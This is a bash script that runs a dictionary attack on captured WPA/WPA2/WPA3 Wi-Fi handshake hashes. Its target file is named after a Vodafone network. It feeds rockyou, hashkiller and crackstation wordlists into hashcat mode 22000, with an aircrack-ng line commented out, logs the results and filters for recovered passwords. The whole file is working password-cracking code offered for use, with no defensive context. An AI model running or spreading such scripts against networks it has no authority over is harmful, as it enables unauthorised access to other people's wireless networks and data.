#!/bin/bash

# Dictionary List
dictionaries=(
"/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt"
"/my/path/hashes.com-hashkiller_io_2024-12_wordlist.txt"
"/my/path/crackstation.net_wordlist.txt"
)

# Input Hashes WPA/WPA2/WPA3 PMKID 4-way handshake
input_hash="/Vodafone-WIFI-XXXXXX.hc22000"

# I/O Variables
date_format=$(date +"%Y-%m-%d_%H-%M-%S")
file_name_input=$(basename "$input_hash")
output_reports="/WIFI_Cracking/Hashcat Reports/${file_name_input}_${date_format}.txt"

# Cracking Loop
for curr_dictionary in "${dictionaries[@]}"; do
    if [[ -f $curr_dictionary ]]; then
        #aircrack-ng "$input_hash" -w "$curr_dictionary" >> "$output_reports" #SLOWER (CPU)
        hashcat -m 22000 -w 3 "$input_hash" "$curr_dictionary" >> "$output_reports" #FASTER (GPU)
    fi
done
cat "$output_reports" | grep Recovered
